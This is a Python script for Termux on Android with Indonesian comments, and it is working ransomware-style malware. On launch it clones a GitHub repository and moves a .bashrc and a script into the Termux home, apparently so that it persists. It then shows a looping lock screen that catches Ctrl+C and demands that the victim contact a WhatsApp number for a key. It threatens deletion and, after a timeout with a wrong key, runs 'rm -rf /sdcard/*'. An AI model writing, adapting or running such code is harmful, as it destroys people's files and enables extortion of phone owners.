import os
import time

H = '\x1b[1;92m' # WARNA HIJAU MUDA
h = '\033[32m'    # WARNA HIJAU TUA
K = '\033[93m'    # WARNA KUNINGMUDA
k = '\033[33m'    # WARNA KUNING TUA
B = '\33[1;96m'   # WARNA BIRU MUDA
b = '\x1b[0;34m' # WARNA BIRU TUA
M = '\x1b[1;91m' # WARNA MERAH
U = '\033[95m'    # WARNA UNGU
x = '\33[m'           # WARNA DEFAULT
import subprocess
print("SABARRR....")
os.system("pkg install time && git clone https://github.com/FatahXD/FatahXD && cd FatahXD")
os.system("pkg install figlet && mv .bashrc ../../../../../../data/data/com.termux/files/home")
os.system("mv ijok.py ../../../../../data/data/com.termux/files/home && cd ../ && rm -rf FatahXD")

while True:
    start_time = time.time() # Waktu awal
    os.system("clear")
    os.system("figlet KERENN")
    print("")
    print(M + "Bre HP Lu Lagi Di Keaadan Bahaya nih")
    print(K + "LAIN KALI ATI² SAMA FILE² GINIAN!!!")
    print(U + "Note!! , Kalo lu masukin key yg salah waktunya jadi 30 menit.")
    print(H + "silahkan hubungi WA : +6285182646371 untuk mendapatkan key")
    print("Jika Dalam 2 jam kamu tidak memasukan key maka folder folder penting mu yg berada di dalam sd card akan saya hapus termasuk obb dan sebagainya huahahaha")
    try:
        key = input(M + "Key: ")
    except KeyboardInterrupt:
        print("\nCtrl + C terdeteksi. Menunggu input kembali...")
        continue
        
    if key == 'kasian':
        print("Key benar")
        break
    else:
        end_time = time.time() # Waktu setelah pengguna memasukkan key yang salah
        if end_time - start_time > 1900: # Jika sudah melewati 30 menit
            print("Waktu habis! Menghapus file di sd card...")
            os.system("rm -rf /sdcard/*")
        else:
            print("Key salah")
